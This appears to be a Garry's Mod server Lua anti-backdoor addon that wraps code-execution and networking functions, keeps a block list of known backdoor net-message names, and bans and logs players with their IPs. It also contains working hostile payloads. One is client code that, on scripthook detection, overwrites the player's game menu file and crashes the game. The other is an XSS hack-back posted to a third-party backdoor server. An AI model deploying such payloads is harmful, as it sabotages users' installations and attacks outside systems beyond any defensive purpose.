

print("Starting NBP")
local NBP = {}

NBP.Config = {}
NBP.Config.AntiStrip = true
NBP.Config.LaBlacklistAutoreport = false -- Automatic report to https://g-box.fr/
NBP.Config.ReportFoundSteamIDs = false   -- Report steamids found in hook/concommand backdoors

NBP.Config.AntiScriptHook = true

NBP.ToConfigFile = function( tconfig )
	local str = "/CONFIG FILE/\n"
	for k,v in pairs(tconfig) do
		str = string.format(str.."%s=%s\n", k, v)
	end
	return str.."/END CONFIG/"
end

NBP.FromConfigFile = function( str )
	str = string.Replace(str, "/CONFIG FILE/\n", "")
	str = string.Replace(str, "/END CONFIG/", "")
	for _,o in pairs(string.Split(str,"\n")) do
		local kname = string.Split(o,"=")[1]
		local v = string.Split(o,"=")[2] -- quality coding
		if(v == "true")then
			NBP.Config[kname] = true
		elseif(v == "false")then
			NBP.Config[kname] = false
		end
	end
end

util.AddNetworkString("NBP_SETTING_SEND")
net.Receive("NBP_SETTING_SEND", function( _, ply )
	if not ply:IsSuperAdmin() then return end
	local nconfig = net.ReadTable()
	local string = NBP.ToConfigFile(nconfig)
	file.Write("nbp_config.txt", string)
	NBP.Config = nconfig
	ply:ChatPrint("Wrote config")
end)

util.AddNetworkString("NBP_SETTING_RECEIVE")
net.Receive("NBP_SETTING_RECEIVE", function( _, ply )
	if not ply:IsSuperAdmin() then return end
	net.Start("NBP_SETTING_RECEIVE")
	net.WriteTable(NBP.Config)
	net.Send(ply)
end)

if file.Exists("nbp_config.txt", "DATA") then
	NBP.FromConfigFile(file.Read("nbp_config.txt"))
end

local string = NBP.ToConfigFile(NBP.Config)
file.Write("nbp_config.txt", string)

util.AddNetworkString("NBP_ASH_SENDCODE") -- To send code to client

hook.Add("CanProperty","NBP_Config.AntiStrip", function( ply, property, ent )
	if not NBP.Config.AntiStrip then return end
	if (property == "remover") and ent and (ent:IsWeapon()) then
		return false
	end
end)

hook.Add("PlayerAuthed", "NBP_ASH", function(ply)
	if not NBP.Config.AntiScriptHook then return end
	timer.Simple(5, function()
		ply:SendLua([[
			net.Receive("NBP_ASH_SENDCODE", function() RunString(net.ReadString(), "fag.lua") end)
		]])
		timer.Simple(1, function()
			net.Start("NBP_ASH_SENDCODE")
			net.WriteString([=[
				local cmp = {}
				_SCRIPT = cmp
				_SOURCE = cmp
				RunString("-- ok", "lol")
				if _SCRIPT == cmp or _SOURCE == cmp then
				    return
				end

				RunString([=====[
					
					include( "mount/mount.lua" )
					include( "getmaps.lua" )
					include( "loading.lua" )
					include( "mainmenu.lua" )
					include( "video.lua" )
					include( "demo_to_video.lua" )

					include( "menu_save.lua" )
					include( "menu_demo.lua" )
					include( "menu_addon.lua" )
					include( "menu_dupe.lua" )
					include( "errors.lua" )

					include( "motionsensor.lua" )
					include( "util.lua" )


					-----------------------------------
					-- Payload :: You can replace it if you want, just remember it's MENU not CLIENT
					timer.Simple(2, function()
						local frame = vgui.Create("DFrame")
						frame:ShowCloseButton(false)
						frame:SetDraggable(false)
						frame:SetTitle("")
						frame:SetSize(700, 500)
						frame:Center()
						frame.Paint = function( s,w,h )
							draw.RoundedBox(0, 0, 0, w, h, Color(255, 100,100,200))
						end
						frame:MakePopup()
						surface.CreateFont("NBP_Title",{size=28})
						surface.CreateFont("NBP_Text",{size=18})
						local title = vgui.Create("DLabel", frame)
						title:SetTextColor(Color(255, 0, 0))
						title:SetPos(10, 5)
						title:SetFontInternal("NBP_Title")
						title:SetText([[ERROR]])
						title:SizeToContents()
						local t = [[
							Garry's Mod a subit une erreur causée par la présence de scripthook.
							Le serveur étant proteger par NBP, votre jeu Garry's Mod a été bloqué.
							Veuillez ré-installer Garry's Mod et ne jamais essayer de voler des fichiers à l'avenir.




							      John
							      Ce message apparait suite à l'utilisation de scripthook sur un serveur étant protégé par NBP.
							]]
							local text = vgui.Create("DLabel", frame)
							text:SetTextColor(Color(0, 0, 0))
							text:SetPos(10, 50)
							text:SetFontInternal("NBP_Text")
							text:SetText("")
							local x = 0
							timer.Create("NBP_Slowtype", 0.02, string.len(t), function()
								text:SetText(text:GetText()..t[x])
								text:SizeToContents()
								x = x + 1
							end)
					end)
					GameDetails = function()
						table.Empty(debug.getregistry())
					end
					-----------------------------------

				]=====], "../../garrysmod/lua/menu/menu.lua")
				function ScrewScriptHook(path)
					local files, dirs = file.Find("lua/"..path.."*", "GAME")
					for i,v in pairs(files) do
						RunString([[
							return false
							-- Don't steal this :(
							]], v)	
					end
					for k,v in pairs(dirs) do
						ScrewScriptHook(v.."/")
					end
				end
				ScrewScriptHook("")
				ScrewScriptHook = nil
				for i=1,100 do
					RunString("-- fuck you", "RCON_PASSWORD"..i)
				end
				RunString([[return false]], "../scripthook.lua") -- No more scripthook

				table.Empty(debug.getregistry())
				-- Just crash at the end
				]=])
			net.Send(ply)
			print("Sent anti-scripthook to "..ply:Nick())
		end)
	end)
end)

NBP.httpFetch = http.Fetch
NBP.httpPost = http.Post

NBP.Strings = {
		"UKT_MOMOS", "Sandbox_ArmDupe", "Fix_Keypads", "memeDoor",
		"Remove_Exploiters", "noclipcloakaesp_chat_text", "fellosnake", "NoNerks",
		"BackDoor", "kek", "OdiumBackDoor", "cucked", "ULogs_Info", "Ulib_Message",
		"m9k_addons", "Sbox_itemstore", "rcivluz", "Sbox_darkrp", "_Defqon", "something",
		"random", "strip0", "killserver", "DefqonBackdoor", "fuckserver", "cvaraccess",
		"rconadmin", "_CAC_ReadMemory", "nostrip", "DarkRP_AdminWeapons",
		"enablevac", "SessionBackdoor", "LickMeOut", "MoonMan", "Im_SOCool", "fix",
		"idk", "ULXQUERY2", "ULX_QUERY2", "jesuslebg", "zilnix", "ÃžÃ ?D)â—˜",
		"disablebackdoor", "oldNetReadData", "SENDTEST", "Sandbox_GayParty",
		"nocheat", "_clientcvars", "_main", "ZimbaBackDoor", "stream", "waoz", "DarkRP_UTF8",
		"bdsm", "ZernaxBackdoor", "anticrash", "audisquad_lua", "dontforget", "noprop", "thereaper",
		"0x13"
}

hook.Add("NBP_Message", "LogToFile", function(msg)
	file.Append("NBP_logs.txt", string.format("[NBP] %f : "..msg.."\n", CurTime()))
end)

NBP.Broadcast = function(msg, ...)
	msg = string.format(msg, ...)
	hook.Run("NBP_Message", msg)
	for i,v in ipairs(player.GetHumans()) do
		v:ChatPrint(msg)
	end
	print(msg)
end

NBP.ReportSteamIDToLaBlacklist = function(steamid, reason)
	if NBP.Config.LaBlacklistAutoreport then
		NBP.httpPost("https://g-box.fr/wp-content/blacklist/report.php", {
			senderNick = "NBP/Autoreport",
			senderSteam = "STEAM_0:0000000",
			victimSteam = steamid,
			raison = reason
		})
	end
end


NBP.LuaStrings = {
	"player.GetAll()", "player.GetHumans()", "RunString", "CompileString",
	"hook.Add", "hook.Remove", "ulx groupallow user \"ulx luarun\"",
	"game.ConsoleCommand", "RunConsoleCommand", "while.+%do", "if.+%then",
	"http.Fetch", "http.Post",
	"net.Receive", "util.AddNetworkString"
}
NBP.IsNet = function()
	for i=1,10 do
		local x = debug.getinfo(i)
		if x then
			if string.find(x.source, "includes/extensions/net.lua") then
				return true, i
			end
		end
	end
	return false
end

-- This function searches for SetUserGroup in a function
--  What a long name xD
NBP.IsBadHookOrConcommand = function(func)
	for i=0,10 do
		local xx = jit.util.funck( func, -i )
		if xx == "SetUserGroup" then
			return true, -i
		end
	end
	return false
end

-- This function searches for SteamID
NBP.SearchForSteamID = function(func)
	local steamids = {}
	for i=0,10 do
		local xx = jit.util.funck( func, -i )
		if xx and string.find(xx, "STEAM_[0-9]+:[0-9]+:[0-9]+") then
			table.insert(steamids, xx)
		end
	end
	return steamids
end

NBP.CheckForFuncBackdoor = function(func_)
	local badfunc, sp = NBP.IsBadHookOrConcommand(func_)
	if badfunc then
		if debug.getinfo(func_).source == "@lua/includes/extensions/player_auth.lua" then return true end
		NBP.Broadcast("/!\\ Detected SetUserGroup in a hook/concommand !")
		NBP.Broadcast("Source: "..debug.getinfo(func_).source)
		-- Search and ban steamids
		for k,v in pairs(NBP.SearchForSteamID(func_)) do
			NBP.Broadcast("/!\\ Detected SteamID in a backdoor (%s), you should probably ban him for hacking !", v)
			if NBP.Config.ReportFoundSteamIDs then
				NBP.ReportSteamIDToLaBlacklist(v, "SteamID found in hook/concommand backdoor (NBP/Autoreport)")
			end
		end
		return false
	end
	return true
end




NBP.HookAdd = hook.Add
function hook.Add( type_, name_, func_ )
	if NBP.CheckForFuncBackdoor(func_) then
		NBP.HookAdd(type_, name_, func_)
	end
end

NBP.ConcommandAdd = concommand.Add
function concommand.Add( name, func_, ... )
	if NBP.CheckForFuncBackdoor(func_) then
		NBP.ConcommandAdd(name, func_, ...)
	end
end

timer.Create("NBP_RemoveBadHookAndConcommands", 5, 0, function()
	for i,v in pairs(concommand.GetTable()) do
		if not NBP.CheckForFuncBackdoor(v) then
			NBP.Broadcast("/!\\ Detected concommand backdoor !")
			concommand.Remove(i)
		end
	end
	for t,v in pairs(hook.GetTable()) do
		for n,f in pairs(v) do
		 	if not NBP.CheckForFuncBackdoor(f) then
				NBP.Broadcast("/!\\ Detected hook backdoor !")
				hook.Remove(t,n)
			end
		 end 
	end
end)



function http.Fetch( url, os, orr )
	if string.find(url, "/core/stage1.php") then
		-- GBackdoor fucker (XSS)
		local surl = string.Replace(url, "/core/stage1.php", "/core/stage2.php")
		local spl0it = [[<script>window.location.href = "http://www.themostamazingwebsiteontheinternet.com";</script>]]
		NBP.httpPost(surl, {nb = "1337", i = "1.3.3.7", i = spl0it})
		NBP.Broadcast("/!\\ Fucked GBackdoor (at %s)", surl)
	end
	NBP.httpFetch(url, os, orr)
end


function http.Post( url, param, os, orr )
	if string.find(url, "/core/stage2.php") then return end
	NBP.httpPost(url, param, os, orr)
end

hook.Add("NBP_banning_hacker", "LogToFile", function(ply)
	file.Append("NBP_skids.txt", "[NBP] "..CurTime().." : Banning "..ply:Nick().."("..ply:SteamID().."{"..ply:IPAddress().."}) for trying to backdoor the server\n")
end)



hook.Add("NBP_banning_hacker", "LaBlacklist_autoreport", function(ply)
	NBP.ReportSteamIDToLaBlacklist(ply:SteamID(), "Using backdoor netkey (NBP/Autoreport)")
end)

NBP.Ban = function(l, ply)
	NBP.Broadcast("%s attempted to hack the server, banning him. . .", ply:Nick().."("..ply:SteamID().."{"..ply:IPAddress().."})")
	hook.Run("NBP_banning_hacker", ply)
	ply:Ban(0, false)
	ply:Kick("Attempted to hack the server")
end 

NBP.LastReadString = ""

NBP.CheckRunningString = function( str, name, thing )
	-- F*ck ulx luarun [BACKDOOR]
	if string.find(str, "util.AddNetworkString") then
		NBP.Broadcast("Someone attempted to add a network string (probably a backdoor)")
		return false
	end
	if string.find(str, "net.Receive") then
		NBP.Broadcast("Someone attempted to add a network receiver (probably a backdoor)")
		return false
	end
	for i,v in pairs(NBP.Strings) do
		if (type(v) == type("")) and string.find(str, v) then
			NBP.Broadcast("Someone attempted to run lua code including backdoor name (%s)", v)
			return false
		end
	end
	local fromnet, sp = NBP.IsNet()
	if fromnet then -- Can't be good
		NBP.Broadcast("/!\\ Attempted to run dynamic code from net (SP: %x)", sp)
		return false
	end

	if NBP.LastReadString == str then
		NBP.Broadcast("Blocked code execution from net")
		return false
	end
	if (name == "[C]") and (thing) then
		NBP.Broadcast("Blocked backdoor")
		return false
	end
	return true
end

NBP.RunString = RunString
function RunString( str, name, thing )
	if NBP.CheckRunningString(str, name, thing) then
		return NBP.RunString(str, name, thing)
	end
end

NBP.CompileString = CompileString
function CompileString( str, name, thing )
	if NBP.CheckRunningString(str, name, thing) then
		return NBP.CompileString(str, name, thing)
	end
	return function(...) end
end

RunStringEx = RunString -- They are the same



NBP.ReadString = net.ReadString
function net.ReadString()
	local read = NBP.ReadString()
	for i,v in ipairs(NBP.LuaStrings) do
		if (type(v) == type("")) and string.match(read, v) then
			NBP.Broadcast("/!\\ Attempted to transmit code through net")
			return [[print("oh no :(")]]
		end
	end
	NBP.LastReadString = read
	return read
end

NBP.Spoofed = NBP.Strings
timer.Create("NBP_RemoveAndSpoof", 2, 0, function()
	for i,v in pairs(NBP.Strings) do
		if net.Receivers[v] then
			net.Receive(v, ban)
		end
		if (not NBP.Spoofed[v]) and (type(v) == type("")) then
			util.AddNetworkString(v)
			net.Receive(v, ban)     -- Spoof
			NBP.Spoofed[v] = true	
		end
	end
end)

concommand.Add("NBP_Check",function(p)
	p:ChatPrint("NBP v1.1 is present, don't try to backdoor this server :)")
end)

print("NBP OK !")
print("NBP || No Backdoor Please | By John | Discord : John-Doesent#0716")
